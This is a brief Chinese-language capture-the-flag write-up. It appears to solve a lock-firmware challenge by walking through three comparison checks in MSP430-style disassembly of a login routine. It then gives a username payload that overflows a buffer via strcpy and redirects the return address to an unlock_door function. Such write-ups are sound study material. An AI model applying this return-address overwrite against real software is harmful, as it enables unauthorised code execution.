```
共有三個檢查

檢查一 ( -0x18(r4) > r15 ? )
45e4:  5f44 e8ff      mov.b	-0x18(r4), r15
45e8:  8f11           sxt	r15
45ea:  0b9f           cmp	r15, r11
45ec:  0628           jnc	#0x45fa <login+0xaa>

檢查二 ( -0x19(r4) < r15 ? )
45fa:  5f44 e7ff      mov.b	-0x19(r4), r15
45fe:  8f11           sxt	r15
4600:  0b9f           cmp	r15, r11
4602:  062c           jc	#0x4610 <login+0xc0>

檢查三 (-0x6(r4) == 0 ? )
464c:  c493 faff      tst.b	-0x6(r4)
4650:  0624           jz	#0x465e <login+0x10e>

最後，username 可以覆寫 return address (444a 為 unlock_door 的位址)

username : aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa017faaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa4a44
password : bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb

note:
password 不行
因為 -0x6(r4) 要等於 0x00 ，而 strcpy 遇到 0x00 就會停止
因此只能用 username 覆蓋

```
